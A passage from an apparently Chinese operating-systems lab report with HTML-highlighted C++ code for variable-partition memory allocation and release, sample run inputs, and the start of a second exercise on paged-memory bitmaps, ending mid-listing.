class="hljs-built_in">endl</span>;<br>i--;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; i; j++)<br>&#123;<br><span class="hljs-keyword">if</span> ((work[i].start &gt; work[j].start) &amp;&amp; (work[i].start &lt; work[j].end))<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;与作业&quot;</span> &lt;&lt; j &lt;&lt; <span class="hljs-string">&quot;部分重叠，请重新输入&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>i--;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((work[j].start &gt; work[i].start) &amp;&amp; (work[j].start &lt; work[i].end))<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;与作业&quot;</span> &lt;&lt; j &lt;&lt; <span class="hljs-string">&quot;部分重叠，请重新输入&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>i--;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>sort(work + <span class="hljs-number">1</span>, work + <span class="hljs-number">1</span> + workcnt, cmp);<br><span class="hljs-comment">//OS相当于最开始的作业</span><br>work[<span class="hljs-number">0</span>].start = <span class="hljs-number">0</span>;<br>work[<span class="hljs-number">0</span>].len = os_len;<br>work[<span class="hljs-number">0</span>].end = os_len;<br><span class="hljs-comment">//基于主存剩余空间构建空闲表</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= workcnt; i++)<br>&#123;<br><br><span class="hljs-keyword">if</span> (work[i].start &gt; work[i - <span class="hljs-number">1</span>].end) <span class="hljs-comment">//起址大于上一项的尾地址，则构建空闲区</span><br>&#123;<br>Freecnt++; <span class="hljs-comment">//空闲区个数加1</span><br>Free[Freecnt].start = work[i - <span class="hljs-number">1</span>].end;<br>Free[Freecnt].len = work[i].start - work[i - <span class="hljs-number">1</span>].end;<br>Free[Freecnt].end = work[i].start;<br>&#125;<br>&#125;<br><span class="hljs-comment">//主存末端的空闲区</span><br><span class="hljs-keyword">if</span> (work[workcnt].end &lt; max_len) <span class="hljs-comment">//起址最后的作业的尾地址小于主存长度则存在</span><br>&#123;<br>Freecnt++;<br>Free[Freecnt].start = work[workcnt].end;<br>Free[Freecnt].len = max_len - Free[Freecnt].start;<br>Free[Freecnt].end = max_len;<br>&#125;<br>display_work();<br>display_Free();<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//分配新作业</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">alloc</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;开始分配新作业：&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-type">int</span> tempcnt = workcnt + <span class="hljs-number">1</span>; <span class="hljs-comment">//作业编号的临时值</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入作业&quot;</span> &lt;&lt; tempcnt &lt;&lt; <span class="hljs-string">&quot;长度：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; work[tempcnt].len;<br>work[tempcnt].num = tempcnt;<br><span class="hljs-type">bool</span> flag = <span class="hljs-number">0</span>; <span class="hljs-comment">//分配是否成功的标记</span><br><span class="hljs-comment">//遍历(未分配)空闲表</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= Freecnt; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (Free[i].len &gt;= work[tempcnt].len) <span class="hljs-comment">//空闲区长度大于等于作业长度，则可在此空闲区分配</span><br>&#123;<br><span class="hljs-comment">//确定作业起址</span><br>work[tempcnt].start = Free[i].start;<br>work[tempcnt].end = work[tempcnt].start + work[tempcnt].len;<br><span class="hljs-comment">//修改空闲区</span><br>Free[i].len -= work[tempcnt].len;<br>Free[i].start += work[tempcnt].len;<br><span class="hljs-keyword">if</span> (Free[i].len == <span class="hljs-number">0</span>) <span class="hljs-comment">//若空闲区长度变为0，删除该空闲区</span><br>&#123;<br>Freecnt--;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i; j &lt;= Freecnt; j++)<br>&#123;<br>Free[j] = Free[j + <span class="hljs-number">1</span>];<br>&#125;<br>&#125;<br><span class="hljs-comment">//标记：成功</span><br>flag = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (flag) <span class="hljs-comment">//分配成功</span><br>&#123;<br>workcnt++; <span class="hljs-comment">//主存中作业数加一</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;分配成功！起址为&quot;</span> &lt;&lt; work[workcnt].start &lt;&lt; <span class="hljs-string">&quot;K&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;----------------------&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>sort(work + <span class="hljs-number">1</span>, work + <span class="hljs-number">1</span> + workcnt, cmp); <span class="hljs-comment">//按起址排序</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;分配失败！&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;----------&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br>display_work();<br>display_Free();<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//作业撤离，归还空间</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> temp_num;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入要撤离的作业编号：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; temp_num;<br><span class="hljs-type">bool</span> flag1 = <span class="hljs-number">0</span>; <span class="hljs-comment">//标记作业是否存在于主存</span><br><span class="hljs-type">int</span> pos;        <span class="hljs-comment">//作业位置</span><br><span class="hljs-comment">//寻找作业位置</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= workcnt; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (work[i].num == temp_num)<br>&#123;<br>flag1 = <span class="hljs-number">1</span>;<br>pos = i;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (flag1 == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;该作业不在主存中！&quot;</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;------------------&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">//检查是否有与归还区下邻的空闲区</span><br><span class="hljs-type">bool</span> flag2 = <span class="hljs-number">0</span>; <span class="hljs-comment">//标记：是否有与归还区下邻的空闲区</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= Freecnt; i++)<br>&#123;<br><span class="hljs-comment">//若有，合并成一个较大的空闲区</span><br><span class="hljs-keyword">if</span> (work[pos].end == Free[i].start)<br>&#123;<br>flag2 = <span class="hljs-number">1</span>;<br>Free[i].start = work[pos].start;<br>Free[i].len += work[pos].len;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//检查是否有与归还区上邻的空闲区</span><br><span class="hljs-type">bool</span> flag3 = <span class="hljs-number">0</span>; <span class="hljs-comment">//标记：是否有与归还区上邻的空闲区</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= Freecnt; i++)<br>&#123;<br><span class="hljs-comment">//若有</span><br><span class="hljs-keyword">if</span> (work[pos].end == Free[i].start)<br>&#123;<br>flag3 = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (flag2) <span class="hljs-comment">//若归还区已和下邻的空闲区合并，合成一个更大的空闲区</span><br>&#123;<br>Free[i].len += Free[i + <span class="hljs-number">1</span>].len;<br>Free[i].end = Free[i + <span class="hljs-number">1</span>].end;<br><span class="hljs-comment">//删除被合并的空闲区</span><br>Freecnt--;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i + <span class="hljs-number">1</span>; j &lt;= Freecnt; j++)<br>&#123;<br>Free[j] = Free[j + <span class="hljs-number">1</span>];<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!flag2) <span class="hljs-comment">//若归还区没有和下邻的空闲区合并</span><br>&#123;<br>Free[i].len += work[pos].len;<br>Free[i].end = work[pos].end;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (flag2 == <span class="hljs-number">0</span> &amp;&amp; flag3 == <span class="hljs-number">0</span>) <span class="hljs-comment">//若没有相邻空闲区，则新建一个空闲区</span><br>&#123;<br>Freecnt++; <span class="hljs-comment">//空闲区个数加1</span><br><span class="hljs-comment">//新建</span><br>Free[Freecnt].start = work[pos].start;<br>Free[Freecnt].len = work[pos].len;<br>Free[Freecnt].end = work[pos].end;<br>sort(Free + <span class="hljs-number">1</span>, Free + <span class="hljs-number">1</span> + Freecnt, cmp); <span class="hljs-comment">//排序</span><br>&#125;<br>work[pos].start = <span class="hljs-number">0x3f3f3f</span>;              <span class="hljs-comment">//将被释放的作业的起址改为无穷大</span><br>sort(work + <span class="hljs-number">1</span>, work + <span class="hljs-number">1</span> + workcnt, cmp); <span class="hljs-comment">//排序</span><br>workcnt--;                               <span class="hljs-comment">//在主存中的作业总数减一</span><br>display_work();<br>display_Free();<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>init();<br><span class="hljs-type">int</span> op; <span class="hljs-comment">//操作号</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入操作（1:分配新作业 2:撤离作业 0:结束）：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; op;<br><span class="hljs-keyword">if</span> (op == <span class="hljs-number">1</span>)<br>alloc();<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-number">2</span>)<br>release();<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;程序结束&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="程序运行时的初值及运行结果"><a href="#程序运行时的初值及运行结果" class="headerlink" title="程序运行时的初值及运行结果"></a>程序运行时的初值及运行结果</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>主存空间的长度（长度单位均为k）：128<br>操作系统所占空间的长度：10<br>主存中作业的条目：3<br>第1个作业的起始地址、长度：10 4<br>第2个作业的起始地址、长度：32 8<br>第3个作业的起始地址、长度：14 12</p><p><img src="/2021/12/29/Allocation_and_recycling_of_main_storage_space/image-20211221095922284-16528035152035.png" alt="image-20211221095922284"></p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>分配新作业：</p><p>作业4长度：6</p><p><img src="/2021/12/29/Allocation_and_recycling_of_main_storage_space/image-20211221100054565-16528035182316.png" alt="image-20211221100054565"></p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>撤离作业：</p><p>要撤离的作业编号：3</p><p><img src="/2021/12/29/Allocation_and_recycling_of_main_storage_space/image-20211221100201199-16528035209237.png" alt="image-20211221100201199"></p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>撤离作业：</p><p>要撤离的作业编号：2</p><p><img src="/2021/12/29/Allocation_and_recycling_of_main_storage_space/image-20211221100246670-16528035236648.png" alt="image-20211221100246670"></p><h2 id="第二题-分页式管理方式下的位示图"><a href="#第二题-分页式管理方式下的位示图" class="headerlink" title="第二题 分页式管理方式下的位示图"></a>第二题 分页式管理方式下的位示图</h2><h3 id="实验题目-1"><a href="#实验题目-1" class="headerlink" title="实验题目"></a>实验题目</h3><p>在分页式管理方式下采用位示图来表示主存分配情况，实现主存空间的分配和回收。</p><h4 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h4><p>（1）分页式存储器把主存分成大小相等的若干块，作业的信息也按块的大小分页，作业装入主存时可把作业的信息按页分散存放在主存的空闲块中，为了说明主存中哪些块已经被占用，哪些块是尚未分配的空闲块，可用一张位示图来指出。位示图可由若干存储单元来构成，其中每一位与一个物理块对应，用0/1表示对应块为空闲/已占用。</p><p>（2） 假设某系统的主存被分成大小相等的64块，则位示图可用8个字节来构成，另用一单元记录当前空闲块数。如果已有第0，1，4，5，6，9，11，13，24，31，共10个主存块被占用了，那么位示图情况如下图：</p><p><img src="/2021/12/29/Allocation_and_recycling_of_main_storage_space/image-20211221100857922-16528035278979.png" alt="image-20211221100857922"></p><p>（3） 当要装入一个作业时，根据作业对主存的需要量，先查当前空闲块数是否能满足作业要求，若不能满足则输出分配不成功。若能满足，则查位示图，找出为“0”的一些位，置上占用标志“1”，从“当前空闲块数”中减去本次占用块数。按找到的计算出对应的块号，其计算公式为：块号=j*8+i。其中，j表示找到的是第n个字节，i表示对应的是第n位。根据分配给作业的块号，为作业建立一张页表，页表格式：</p><p><img src="/2021/12/29/Allocation_and_recycling_of_main_storage_space/image-20211221101020009-165280353043610.png" alt="image-20211221101020009"></p><p>（4）当一个作业执行结束，归还主存时，根据该作业的页表可以知道应归还的块号，由块号可计算出在位示图中的对应位置，把对应位的占用标志清成“0”，表示对应的块已成为空闲块。归还的块数加入到当前空闲块数中。由块号计算在位示图中的位置的公式如下：</p><ul><li>字节号 j=[块号/8] （[ ]表示取整）</li><li>位数 i={块号/8} （{ }表示取余）</li></ul><p>（5）设计实现主存分配和回收的程序。假定位示图的初始状态如（2）所述，现有一信息量为5页的作业要装入，运行你所设计的分配程序，为作业分配主存且建立页表（格式如（3）所述）。然后假定有另一作业执行结束，它占用的块号为第4，5，6和31块，运行你所设计的回收程序，收回作业归还的主存块。</p><p>要求能显示和打印分配或回收前后的位示图和当前空闲块数，对完成一次分配后还要显示或打印为作业建立的页表。</p><h3 id="程序中使用的数据结构及符号说明-1"><a href="#程序中使用的数据结构及符号说明-1" class="headerlink" title="程序中使用的数据结构及符号说明"></a>程序中使用的数据结构及符号说明</h3><ol><li><p>结构体及其数组（数据结构），保存作业条目</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span>                //作业条目的结构体</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> page_num;   <span class="hljs-comment">//页个数</span><br><span class="hljs-type">int</span> <span class="hljs-built_in">list</span>[<span class="hljs-number">1001</span>]; <span class="hljs-comment">//页表</span><br><span class="hljs-type">int</span> num;        <span class="hljs-comment">//编号</span><br><span class="hljs-type">bool</span> in;        <span class="hljs-comment">//是否存在于主存</span><br>&#125;;<br>item work[<span class="hljs-number">1001</span>];<br></code></pre></div></td></tr></table></figure></li><li><p>整型数组（数据结构）</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> bit_img[<span class="hljs-number">1001</span>][<span class="hljs-number">1001</span>];   <span class="hljs-comment">//位示图</span><br><span class="hljs-type">int</span> work_list[<span class="hljs-number">1001</span>][<span class="hljs-number">1001</span>]; <span class="hljs-comment">//作业的页表</span><br></code></pre></div></td></tr></table></figure></li><li><p>整型变量</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> byte_num;              <span class="hljs-comment">//位示图的字节数</span><br><span class="hljs-type">int</span> free_block;            <span class="hljs-comment">//空闲块数</span><br><span class="hljs-type">int</span> work_cnt;              <span class="hljs-comment">//总数</span><br></code></pre></div></td></tr></table></figure></li><li><p>自定义函数</p><ul><li><code>void display_bit()</code>：输出位示图</li><li><code>void display_page(int i)</code>：输出作业work[i]的页表</li><li><code>void init()</code>：初始化</li><li><code>void create()</code>：分配新作业</li><li><code>void release()</code>：回收作业</li></ul></li></ol><h3 id="源程序并附上注释-1"><a href="#源程序并附上注释-1" class="headerlink" title="源程序并附上注释"></a>源程序并附上注释</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iomanip&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> bit_img[<span class="hljs-number">1001</span>][<span class="hljs-number">1001</span>];   <span class="hljs-comment">//位示图</span><br><span class="hljs-type">int</span> work_list[<span class="hljs-number">1001</span>][<span class="hljs-number">1001</span>]; <span class="hljs-comment">//作业的页表</span><br><span class="hljs-type">int</span> byte_num;              <span class="hljs-comment">//位示图的字节数</span><br><span class="hljs-type">int</span> free_block;            <span class="hljs-comment">//空闲块数</span><br><span class="hljs-type">int</span> work_cnt;              <span class="hljs-comment">//总数</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">item</span>                //作业条目的结构体</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> page_num;   <span class="hljs-comment">//页个数</span><br><span class="hljs-type">int</span> <span class="hljs-built_in">list</span>[<span class="hljs-number">1001</span>]; <span class="hljs-comment">//页表</span><br><span class="hljs-type">int</span> num;        <span class="hljs-comment">//编号</span><br><span class="hljs-type">bool</span> in;        <span class="hljs-comment">//是否存在于主存</span><br>&#125;;<br>item work[<span class="hljs-number">1001</span>];<br><br><span class="hljs-comment">//输出位示图</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">display_bit</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;位示图如下：&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//表头</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;| 位数 |&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span> &lt;&lt; setw(<span class="hljs-number">2</span>) &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; |&quot;</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|字节数|&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;____&quot;</span><br>     &lt;&lt; <span class="hljs-string">&quot;|&quot;</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; byte_num; j++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|  &quot;</span> &lt;&lt; setw(<span class="hljs-number">2</span>) &lt;&lt; j &lt;&lt; <span class="hljs-string">&quot;  |&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span> &lt;&lt; setw(<span class="hljs-number">2</span>) &lt;&lt; bit_img[j][i] &lt;&lt; <span class="hljs-string">&quot; |&quot;</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">48</span>; i++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&#x27;-&#x27;</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;当前空闲块数：&quot;</span> &lt;&lt; free_block &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-comment">//输出作业work[i]的页表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">display_page</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;作业&quot;</span> &lt;&lt; work[i].num &lt;&lt; <span class="hljs-string">&quot;的页表如下&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//表头</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;| 页号 | 块号 |&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; work[i].page_num; j++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|  &quot;</span> &lt;&lt; setw(<span class="hljs-number">2</span>) &lt;&lt; j &lt;&lt; <span class="hljs-string">&quot;  | &quot;</span> &lt;&lt; setw(<span class="hljs-number">4</span>) &lt;&lt; work[i].<span class="hljs-built_in">list</span>[j] &lt;&lt; <span class="hljs-string">&quot; |&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;--------------&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-comment">//初始化</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入位示图的字节数：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; byte_num;<br>free_block = byte_num * <span class="hljs-number">8</span>;<br><span class="hljs-comment">//初始化位示图每一位为0</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; byte_num; j++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>&#123;<br>bit_img[j][i] = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//初始化主存中的作业</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入主存中作业的个数：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; work_cnt;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= work_cnt; i++)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;请输入第&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;个作业的信息&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;编号：&quot;</span>;<br><span class="hljs-built_in">cin</span> &gt;&gt; work[i].num;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;页个数：&quot;</span>;<br><span class="hljs-built_in">cin</span> 